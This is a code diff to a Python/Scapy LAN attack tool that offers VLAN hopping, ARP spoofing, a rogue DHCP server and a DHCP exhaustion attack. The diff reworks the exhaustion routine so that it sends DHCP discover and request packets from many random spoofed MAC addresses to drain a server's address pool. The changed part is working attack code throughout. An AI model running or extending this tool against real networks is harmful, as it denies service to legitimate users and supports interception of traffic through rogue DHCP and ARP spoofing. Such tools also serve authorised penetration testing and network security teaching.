@@ -25,7 +25,7 @@ vlanhop_parser = subparsers.add_parser('vlanhop',help='VLAN Hopping')
 
 arpspoof_parser = subparsers.add_parser('arpspoof',help='ARP Spoofing')
 
-dhcpstarvation_parser = subparsers.add_parser('dhcpstarvation',help='DHCP Starvation attack')
+dhcpexhaustion_parser = subparsers.add_parser('dhcpexhaustion',help='DHCP exhaustion attack')
 
 dhcpserver_parser = subparsers.add_parser('dhcpserver',help='DHCP Server')
 
@@ -44,8 +44,8 @@ arpspoof_parser.add_argument("-t","--target",help="IP address of the target devi
 arpspoof_parser.add_argument("-i","--impersonate",help="IP address of the device you want to impersonate to the target.",required=True)
 arpspoof_parser.add_argument("-f","--frequency",help="Frequency of ARP replies, default=0.5s",default=0.5)
 
-dhcpstarvation_parser.add_argument("-c","--count",help="Amount of DHCP requests, default=1000",default=1000,type=int)
-dhcpstarvation_parser.add_argument("-s","--dhcpserver",help="IP of DHCP Server, if known specified, retrieve")
+dhcpexhaustion_parser.add_argument("-c","--count",help="Amount of DHCP requests, default=1000",default=1000,type=int)
+dhcpexhaustion_parser.add_argument("-s","--dhcpserver",help="IP of DHCP Server, if known specified, retrieve")
 
 dhcpserver_parser.add_argument("-s","--scope",help="IP Range of provided IPs by the DHCP Server. Format: 192.168.100.20-192.168.100.50",required=True)
 dhcpserver_parser.add_argument("-sn","--subnetmask",help="Subnetmask for the provided IPs",required=True)
@@ -81,9 +81,15 @@ event_LACP_Established = threading.Event()
 
 src_mac = ""
 
+# DHCP Leases for DHCP Server
 dhcp_leases = {}
-
 dhcp_leases["00:11:22:33:44:55"] = {"ip": "192.168.1.100", "expiry": 5000, "transaction_id":0x123123}
+
+# DHCP Offers for DHCP exhaustion
+dhcp_offers = {}
+dhcp_offers["00:11:22:33:44:55"] = {"ip": "192.168.1.100", "transaction_id":0x123123}
+
+
 
 
 # level 0 = standard output, level 1 = info, level 2 = debug
@@ -128,10 +134,13 @@ def allocate_ip(mac):
 
 def handle_dhcp_packet(packet,transaction_id):
     global dhcp_leases
+    global dhcp_offers
     dprint("handle_dhcp_packet(). Options:",packet[DHCP].options[0][1],level=2)
-    if DHCP in packet and packet[DHCP].options[0][1] == 2 and packet[BOOTP].xid == transaction_id:  # DHCP Offer
-        offered_ip = packet[BOOTP].yiaddr
-        send_dhcp_request(offered_ip,transaction_id)
+    if DHCP in packet and packet[DHCP].options[0][1] == 2:  # DHCP Offer
+        for entry in dhcp_offers.values():
+           if entry.get('transaction_id') == packet[BOOTP].xid:
+               dhcp_offers[packet[Ether].dst]['ip'] = packet[BOOTP].yiaddr
+               send_dhcp_request(packet[Ether].dst)
     if DHCP in packet and packet[DHCP].options[0][1] == 1 and transaction_id == "":  # DHCP Discover
         dhcp_leases[str(packet[Ether].src)] = {"transaction_id":packet[BOOTP].xid}
         allocate_ip(packet[Ether].src)
@@ -155,8 +164,6 @@ def send_dhcp_ack(mac):
     sendp(dhcp_ack,verbose=False)
 
 
-
-
 def send_dhcp_offer(mac):
     global dhcp_leases
     dhcp_lease = dhcp_leases[mac]
@@ -171,40 +178,48 @@ def send_dhcp_offer(mac):
     sendp(dhcp_offer,verbose=False)
 
 
-def send_dhcp_discover(transaction_id):
-    global dhcp_leases
-    dhcp_lease = dhcp_leases[mac]
+def send_dhcp_discover(mac):
+    global dhcp_offers
+    dhcp_offer = dhcp_offers[mac]
+    #global src_mac
+    #mac = mac_to_bin(src_mac)
     dhcp_discover = (
-        Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
+        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
         IP(src="0.0.0.0", dst="255.255.255.255") /
         UDP(sport=68, dport=67) /
-        BOOTP(op=1, chaddr=mac_to_bin(src_mac) + b"\x00" * 10,xid=transaction_id) /
+        BOOTP(op=1, chaddr=mac_to_bin(mac) + b"\x00" * 10,xid=dhcp_offer['transaction_id']) /
         DHCP(options=[("message-type", "discover"), "end"])
     )
     sendp(dhcp_discover,verbose=False)
 
-def send_dhcp_request(offered_ip,transaction_id):
+def send_dhcp_request(mac):
+    global dhcp_offers
+    dhcp_offer = dhcp_offers[mac]
+    dprint("MAC:",mac,level=2)
+    dprint("Transaction_ID:",dhcp_offer['transaction_id'],level=2)
     dhcp_request = (
-        Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
+        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
         IP(src="0.0.0.0", dst="255.255.255.255") /
         UDP(sport=68, dport=67) /
-        BOOTP(op=1, chaddr=mac_to_bin(src_mac) + b"\x00" * 10,xid=transaction_id) /
+        BOOTP(op=1, chaddr=mac_to_bin(mac) + b"\x00" * 10,xid=dhcp_offer['transaction_id']) /
         DHCP(options=[("message-type", "request"),
-                      ("requested_addr", offered_ip),
+                      ("requested_addr", dhcp_offer['ip']),
                       "end"])
     )
-    print("Requesting",offered_ip,"...")
+    print("Requesting",dhcp_offer['ip'],"...")
     sendp(dhcp_request,verbose=False)
 
-def dhcpstarvation():
+def dhcpexhaustion():
     global src_mac
+    global dhcp_offers
 
     print("Launching DHCP Server exhaustion attack")
     for i in range(main_args.count):
        transaction_id = random.randint(0,0xFFFFFFFF)
        src_mac = unicast_randMAC()
-       send_dhcp_discover(transaction_id)
-       sniff(prn=lambda packet:handle_dhcp_packet(packet,transaction_id), filter="udp and port 68", count=1, timeout=1)
+       dhcp_offers[src_mac]= {'transaction_id':transaction_id}
+       send_dhcp_discover(src_mac)
+       sniff(prn=lambda packet:handle_dhcp_packet(packet,transaction_id), filter="udp and port 68", count=1, timeout=10)
 
 
 def dhcpserver():
@@ -452,8 +467,8 @@ elif action=="vlanhop":
 elif action=="arpspoof":
    arpspoof()
 
-elif action=="dhcpstarvation":
-   dhcpstarvation()
+elif action=="dhcpexhaustion":
+   dhcpexhaustion()
 
 elif action=="dhcpserver":
    dhcpserver()
